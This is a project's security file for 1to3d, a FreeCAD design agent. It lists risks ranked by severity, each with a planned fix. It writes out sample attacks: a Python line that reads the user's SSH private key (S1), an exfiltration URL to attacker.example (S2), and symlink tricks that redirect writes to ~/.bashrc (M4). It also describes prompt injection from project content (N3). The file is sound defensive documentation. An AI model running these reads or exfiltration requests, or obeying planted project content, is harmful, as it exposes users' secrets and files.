# Security

This file lists the known security risks of 1to3d, for every agent it supports: Claude Code, Kilo Code, opencode and GitHub Copilot. It is the source of truth for open security work.

When a risk is fixed, the fix is committed first. Then, in a separate commit, the entry is removed from this file and recorded in `CHANGELOG.md`.

The main goal is to **keep the agent inside the current project folder**: it should not read or write anything outside it, apart from the skill's own files.

## Reporting a vulnerability

Report it privately through GitHub's private vulnerability reporting on [satinjeet/1to3d](https://github.com/satinjeet/1to3d/security), not in a public issue.

## Levels

| Level | Meaning |
|---|---|
| Severe | The agent can read secrets outside the project, or send data off the machine, with no control except the user's approval of each call. |
| Moderate | The agent can read or write outside the project through a gap in its permissions or helpers, usually through content planted in an untrusted project. |
| Low | Needs an unusual setup or another local attacker, or the harm is limited. |
| Notice | Known by design and documented. Kept here so it is not forgotten. |

Each entry lists the agents it affects, the risk, and the planned fix.

---

## Severe

### S1. FreeCAD code can read any file on the machine

- **Agents:** all
- **Where:** MCP Bridge tools `execute_python` and `execute_python_file`
- **Risk:** These tools run any Python inside FreeCAD, with the user's file access. They run outside each agent's sandbox and permission rules. A script such as `print(open(os.path.expanduser("~/.ssh/id_rsa")).read())` returns the file's contents to the model. The only controls today are the user's approval of each run and the "no reading outside the project" instruction in `skills/freecad/SKILL.md`. An instruction is not a restriction.
- **Fix:**
  - Document how to sandbox FreeCAD itself, so it can only see the projects folder and the skill folder:
    - Flatpak: `flatpak override --user --nofilesystem=home --filesystem=<projects dir> --filesystem=<skill dir>:ro org.freecad.FreeCAD`
    - Native install: run FreeCAD under `bwrap` or `firejail` with the same limits.
  - The skill folder is the Claude/Copilot plugin cache or `~/.agents/skills/freecad`, and FreeCAD must be able to read it to import `fc_design`.
  - This is the only complete fix. Agent-side checks (see L1) only narrow the risk.

### S2. Data can be sent off the machine with web fetch

- **Agents:** Kilo, opencode, Copilot
- **Where:** `kilo/agents/freecad-designer.md` has no `webfetch` or `websearch` rule, so the default (allow) applies. `copilot/agents/freecad-designer.agent.md` has no `tools:` list, so the agent gets the web fetch tool.
- **Risk:** After reading a secret (S1), the model can send it out in a request such as `https://attacker.example/?d=<secret>`, for example when prompt injection in the project tells it to. The design workflow never needs the web.
- **Fix:**
  - Kilo/opencode: add `webfetch: deny` and `websearch: deny` to the agent's `permission` block.
  - Copilot: add a `tools:` list without web fetch (see M3).
  - Claude: already safe. The agent's `tools` list has no WebFetch, and Bash asks before each command.

---

## Moderate

### M1. Claude agent has no path limits

- **Agents:** Claude Code
- **Where:** `agents/freecad-designer.md`, `tools: Read, Write, Edit, Glob, Grep, Bash, ...`
- **Risk:** Read, Glob and Grep accept any path. With Claude Code's sandbox on, Bash can read everything except paths in `sandbox.filesystem.denyRead`. As far as we know, a plugin cannot ship permission rules, and plugin-shipped agents cannot set `permissionMode` or `hooks` in frontmatter. **Verify this against the current Claude Code docs.** Hooks in the plugin's `hooks/hooks.json` apply to every session of the user, not only to this agent.
- **Fix:**
  - Document user or project settings that deny reads of sensitive paths, for example `permissions.deny: ["Read(~/.ssh/**)", "Read(~/.aws/**)", "Read(~/.config/**)"]` and `sandbox.filesystem.denyRead`.
  - If agent frontmatter hooks are supported for plugin agents, add a `PreToolUse` hook that rejects Read/Glob/Grep/Edit/Write paths whose realpath is outside `$CLAUDE_PROJECT_DIR` or `$CLAUDE_PLUGIN_ROOT`.

### M2. Kilo/opencode agent has no read or external-folder rules

- **Agents:** Kilo, opencode
- **Where:** `kilo/agents/freecad-designer.md` `permission` block
- **Risk:** There is no rule for `read`, `glob`, `grep`, `list` or `external_directory`, so these tools use their defaults, and the defaults can allow reads outside the project.
- **Fix:** Add `external_directory` set to `deny`, with one allow for the skill folder. The skill must stay readable, because a global install puts it outside the project (`~/.agents/skills/freecad/**`) and the agent reads `references/*.md` from there. Check the exact pattern syntax against the Kilo 7 and opencode docs.

### M3. Copilot agent gets every tool

- **Agents:** Copilot CLI, VS Code Copilot Chat
- **Where:** `copilot/agents/freecad-designer.agent.md` frontmatter has no `tools:` list
- **Risk:** The agent gets every built-in and MCP tool, web fetch included (S2). The README does not warn against `--allow-all-paths`, which lets Copilot read and write outside trusted folders without asking.
- **Fix:**
  - Add a `tools:` list with only the tools the workflow needs: read, edit, search, shell, and the `freecad` MCP tools.
  - In the README Security section, add `--allow-all-paths` to the flags not to use.

### M4. Kilo edits under `designs/` follow symlinks without asking

- **Agents:** Kilo, opencode
- **Where:** `kilo/agents/freecad-designer.md`, `edit: "designs/**": allow`
- **Risk:** An untrusted repo can commit `designs/<slug>/README.md` as a symlink to `~/.bashrc` or another file. The agent edits the README, which runs without a prompt, and the write lands outside the project.
- **Fix:** Change `"designs/**"` to `ask`. Also tell the skill to check that files under `designs/` are not symlinks before it edits them.

### M5. FreeCAD helper writes and deletes through symlinks

- **Agents:** all
- **Where:** `skills/freecad/scripts/fc_design.py`, `Design.__init__` and `export_browser`
- **Risk:** `Design` does not resolve symlinks under its root. If `cad/`, `browser/`, `browser/parts/` or an asset folder in an untrusted project is a symlink, FreeCAD writes files outside the project. `export_browser` calls `shutil.rmtree` on `browser/parts/`. When `browser/` is a symlink, it deletes the `parts/` folder inside the target.
- **Fix:** Resolve `root` with `os.path.realpath`. Before each write or delete, resolve the target folder and refuse it when it is outside the resolved root.

### M6. Viewer pid file truncates a symlink target

- **Agents:** all
- **Where:** `skills/freecad/scripts/serve_viewer.py`, `main()`: `open(pidfile, "w")`
- **Risk:** If an untrusted project commits `designs/<slug>/browser/.server.pid` as a symlink, starting the viewer truncates and overwrites the file it points to. That can be any file the user can write.
- **Fix:** Open the pid file with `os.open(pidfile, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)`, or delete any existing entry first.

---

## Low

### L1. `execute_python_file` accepts any path

- **Agents:** all
- **Where:** MCP Bridge `execute_python_file`
- **Risk:** The agent can run a Python file from anywhere on the machine, not only `designs/<slug>/cad/make_<slug>.py`. This is part of S1, but it is also a way to run a planted script that the user never sees in the approval prompt.
- **Fix:** Tell the skill to run only files under `designs/` in the project. For Claude, a plugin `PreToolUse` hook on `mcp__plugin_1to3d_freecad__execute_python_file` can reject paths outside `$CLAUDE_PROJECT_DIR`. The hook matches only this plugin's tool, so it does not affect other sessions.

### L2. Other local users can read the viewer

- **Agents:** all
- **Where:** `skills/freecad/scripts/serve_viewer.py`
- **Risk:** The viewer binds to `127.0.0.1` with no token. While it runs, other users and processes on the same machine can download the design's STL files and manifest. `translate_path` keeps requests inside `browser/`.
- **Fix:** Optional. Add a random token to the URL path and reject requests without it.

---

## Notice

### N1. The MCP Bridge has no authentication

- **Agents:** all
- **Risk:** Any local process can send Python to FreeCAD at `127.0.0.1:39280`. The bridge rejects web pages with a non-local `Origin`, but not local programs.
- **Status:** Documented in the README Security section. Stop the add-on or close FreeCAD when not designing.

### N2. Bridge traffic is plain HTTP

- **Agents:** all
- **Risk:** Pointing `FREECAD_MCP_URL` or `.mcp.json` at another host sends code over the network unencrypted, to a host that will run it.
- **Status:** Documented in the README. `install.sh` warns when the URL is not on this machine.

### N3. Prompt injection from project content

- **Agents:** all
- **Risk:** The agent reads files, photos and existing designs in the project. Content written to steer the agent can try to get code run through FreeCAD (S1) or data sent out (S2).
- **Status:** The skill and agents tell the model to treat project content as data. The README tells users to review each FreeCAD run, more so in untrusted repos.

### N4. `curl | sh` trusts the current `main`

- **Agents:** Kilo, opencode
- **Risk:** Piping `install.sh` to `sh` runs whatever is on `main` at that moment.
- **Status:** The README shows how to download and read the script first. `ONETO3D_REF` can pin a tag.

### N5. "Always allow" on FreeCAD tools removes the last control

- **Agents:** all
- **Risk:** Approving `execute_python` for the whole session (Claude "always allow", Copilot `--allow-all-tools`, `--yolo`, `/allow-all`, or Kilo `allow`) removes the only check on S1.
- **Status:** Documented in the README. The Kilo/opencode agent asks before each run by default.
